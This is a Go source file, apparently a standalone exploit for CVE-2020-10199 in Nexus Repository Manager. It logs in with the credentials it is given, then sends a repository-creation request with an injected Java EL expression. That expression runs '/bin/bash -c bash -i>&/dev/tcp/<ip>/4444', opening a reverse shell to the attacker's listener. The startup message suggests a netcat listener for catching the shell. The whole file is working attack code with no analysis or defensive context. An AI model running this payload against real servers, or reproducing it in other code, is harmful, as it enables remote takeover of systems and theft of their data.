package main

import (
	"bufio"
	"bytes"
	"encoding/base64"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"strings"
)

func main() {
	fmt.Println("[*] CVE-2020-10199 test starting\n反弹shell eg:nc -lnvp 4444")
	reader1 := bufio.NewReader(os.Stdin)
	fmt.Print("[*] input username: ")
	username, _, err := reader1.ReadLine()
	if err != nil {
		panic(err)
	}
	reader2 := bufio.NewReader(os.Stdin)
	fmt.Print("[*] input pwd: ")
	pwd, _, err := reader2.ReadLine()
	if err != nil {
		panic(err)
	}
	reader3 := bufio.NewReader(os.Stdin)
	fmt.Print("[*] input url: ")
	url1, _, err := reader3.ReadLine()
	if err != nil {
		panic(err)
	}
	reader4 := bufio.NewReader(os.Stdin)
	fmt.Print("[*] input shell ip(默认端口:4444): ")
	ip, _, err := reader4.ReadLine()
	if err != nil {
		panic(err)
	}

	url2 := string(url1) + "/service/rapture/session"
	username1 := base64.StdEncoding.EncodeToString(username)
	pwd1 := base64.StdEncoding.EncodeToString(pwd)
	// data1 := "username=" + username1 + "&" + "password=" + pwd1
	fmt.Println(url2)
	rep, err := http.PostForm(url2, url.Values{"username": {username1}, "password": {pwd1}})
	if err != nil {
		panic(err)
	}
	b := strings.Split(rep.Header["Set-Cookie"][0], ";")
	sessionID := strings.Split(b[0], "=")[1]

	url3 := string(url1) + "/service/rest/beta/repositories/go/group"

	var client http.Client
	payload1 := `{
	  "name": "internal",
	  "online": true,
	  "storage": {
		"blobStoreName": "default",
		"strictContentTypeValidation": true
	  },
	  "group": {
		"memberNames": ["$\\A{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('/bin/bash -c bash$IFS$9-i>&/dev/tcp/` + string(ip) + `/4444<&1')}"]
	  }
	}`
	payload2 := []byte(payload1)
	req1, err := http.NewRequest("POST", url3, bytes.NewBuffer(payload2))
	// req1.Header.Add("Host", "127.0.0.1:8081")
	req1.Header.Add("X-Requested-With", "XMLHttpRequest")
	req1.Header.Add("X-Nexus-UI", "true")
	req1.Header.Add("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36")
	req1.Header.Add("NX-ANTI-CSRF-TOKEN", "0.6153568974227819")
	req1.Header.Add("Content-Type", "application/json")
	req1.Header.Add("Accept", "*/*")
	req1.Header.Add("Sec-Fetch-Site", "same-origin")
	req1.Header.Add("Sec-Fetch-Mode", "cors")
	req1.Header.Add("Accept-Encoding", "gzip, deflate, br")
	req1.Header.Add("Accept-Language", "zh-CN,zh;q=0.9")
	req1.Header.Add("Cookie", "NX-ANTI-CSRF-TOKEN=0.6153568974227819; NXSESSIONID="+sessionID)
	req1.Header.Add("Connection", "close")
	rep1, err := client.Do(req1)
	if err != nil {
		panic(err)
	}
	if strings.Contains(rep1.Status, "400 Bad Request") {
		fmt.Println("[+] successfully!!")
	} else {
		fmt.Println("[-] error!!")
	}

}
